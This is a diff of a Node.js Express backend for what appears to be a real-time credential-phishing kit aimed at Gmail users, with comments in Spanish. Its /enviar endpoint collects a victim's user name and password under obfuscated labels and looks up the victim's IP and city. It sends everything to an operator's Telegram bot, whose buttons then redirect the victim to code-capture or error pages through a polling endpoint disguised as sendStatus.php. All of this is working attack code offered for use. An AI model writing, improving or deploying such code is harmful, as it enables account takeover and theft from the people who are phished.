@@ -2,87 +2,79 @@ const express = require('express');
 const cors = require('cors');
 const fetch = require('node-fetch');
 const fs = require('fs');
-const path = require('path');
 require('dotenv').config();
+const https = require('https');
+
+// 👉 FORZAR IPv4
+const agent = new https.Agent({ family: 4 });
 
 const app = express();
-app.use(cors());
+
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST'],
+  allowedHeaders: ['Content-Type']
+}));
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+const STATUS_FILE = './status.json';
 
-const CLIENTES_DIR = './clientes';
-if (!fs.existsSync(CLIENTES_DIR)) {
-  fs.mkdirSync(CLIENTES_DIR);
+let clientes = {};
+if (fs.existsSync(STATUS_FILE)) {
+  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
 }
 
-// Limpieza automática cada 10 minutos (archivos > 15 min)
-setInterval(() => {
-  const files = fs.readdirSync(CLIENTES_DIR);
-  const ahora = Date.now();
-
-  files.forEach(file => {
-    const fullPath = path.join(CLIENTES_DIR, file);
-    const stats = fs.statSync(fullPath);
-    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
-
-    if (edadMinutos > 15) {
-      fs.unlinkSync(fullPath);
-      console.log(`Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
-    }
-  });
-}, 10 * 60 * 1000);
-
-function guardarCliente(txid, data) {
-  const ruta = path.join(CLIENTES_DIR, `${txid}.json`);
-  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
+function guardarEstado() {
+  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
 }
 
-function cargarCliente(txid) {
-  const ruta = path.join(CLIENTES_DIR, `${txid}.json`);
-  if (fs.existsSync(ruta)) {
-    return JSON.parse(fs.readFileSync(ruta));
+// 👉 Obtener ciudad con IPv4 forzado
+async function obtenerCiudad(ip) {
+  try {
+    const response = await fetch(`https://ipinfo.io/${ip}/json`, { agent }); // ← FORZADO IPv4
+    const data = await response.json();
+    return data.city || 'Ciudad desconocida';
+  } catch {
+    return 'Ciudad desconocida';
   }
-  return null;
 }
 
-// Recibir credenciales (sin cambios)
+// -----------------------------------------------------------
+//  /enviar
+// -----------------------------------------------------------
 app.post('/enviar', async (req, res) => {
-  const { usar, clavv, txid, ip, ciudad } = req.body;
+  const { usar, clav, txid } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
-GM4YL
-ID: <code>${txid}</code>
+❤️GM4YL❤️
+🆔 ID: <code>${txid}</code>
 
-US4R: <code>${usar}</code>
-CL4V: <code>${clavv}</code>
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
 
-IP: ${ip}
-Ciudad: ${ciudad}
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
 `;
-
-  const cliente = {
-    status: "esperando",
-    codigo: null,
-    usar,
-    clavv,
-    ip,
-    ciudad
-  };
-  guardarCliente(txid, cliente);
 
   const keyboard = {
     inline_keyboard: [
-      [
-        { text: "CONFIRMAR", callback_data: `confirmar:${txid}` },
-        { text: "CÓDIGO", callback_data: `codigo:${txid}` },
-        { text: "ERROR LOGO", callback_data: `errorlogo:${txid}` }
-      ]
+      [{ text: "🔑CONFIRMAR", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
 
+  clientes[txid] = "esperando";
+  guardarEstado();
+
+  // 👉 ENVÍO A TELEGRAM CON IPv4
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -91,84 +83,49 @@ Ciudad: ${ciudad}
       text: mensaje,
       parse_mode: 'HTML',
       reply_markup: keyboard
-    })
+    }),
+    agent // ← FORZADO IPv4
   });
 
   res.sendStatus(200);
 });
 
-// Webhook de Telegram (AJUSTADO AQUÍ)
-app.post('/webhook', async (req, res) => {
-  // Botones inline
-  if (req.body.callback_query) {
-    const callback = req.body.callback_query;
-    const data = callback.data;
-    const [accion, txid] = data.split(':');
 
-    const cliente = cargarCliente(txid);
-    if (!cliente) return res.sendStatus(404);
 
-    // === MAPEO DE ACCIONES A ESTADOS QUE EL FRONTEND ENTIENDE ===
-    let nuevoStatus = "esperando";
-    if (accion === "confirmar") {
-      nuevoStatus = "cel-dina";         // → redirige a aulvald2.html
-    } else if (accion === "codigo") {
-      nuevoStatus = "preguntas";        // → redirige a aulvald.html (2 dígitos)
-    } else if (accion === "errorlogo") {
-      nuevoStatus = "errorlogo";        // → redirige a index2.html
-    }
 
-    cliente.status = nuevoStatus;
-    guardarCliente(txid, cliente);
+// -----------------------------------------------------------
+//  /callback
+// -----------------------------------------------------------
+app.post('/callback', async (req, res) => {
+  const callback = req.body.callback_query;
+  if (!callback || !callback.data) return res.sendStatus(400);
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        callback_query_id: callback.id,
-        text: `Acción: ${accion.toUpperCase()}`
-      })
-    });
+  const [accion, txid] = callback.data.split(":");
+  clientes[txid] = accion;
+  guardarEstado();
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: callback.message.chat.id,
-        text: `Acción "${accion}" aplicada al ID ${txid}`
-      })
-    });
-
-    return res.sendStatus(200);
-  }
-
-  // Comando /txid 22 (sin cambios)
-  if (req.body.message?.text?.startsWith('/')) {
-    // ... (código original sin cambios)
-  }
+  // 👉 ENVÍO CALLBACK A TELEGRAM CON IPv4
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      callback_query_id: callback.id,
+      text: `Has seleccionado: ${accion}`
+    }),
+    agent // ← FORZADO IPv4
+  });
 
   res.sendStatus(200);
 });
 
-// Endpoint único y corregido para polling
-app.get('/api/status', (req, res) => {
+// -----------------------------------------------------------
+//  POLLING
+// -----------------------------------------------------------
+app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
-  if (!txid) return res.status(400).json({ error: "Falta txid" });
-
-  const cliente = cargarCliente(txid);
-
-  if (!cliente) {
-    return res.json({ status: "esperando" });
-  }
-
-  res.json({
-    status: cliente.status || "esperando"
-  });
+  res.json({ status: clientes[txid] || "esperando" });
 });
 
-// Los demás endpoints (/status, etc.) pueden quedarse si los usas en otras páginas
+app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
-app.get('/', (req, res) => res.send("Servidor activo"));
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
+app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
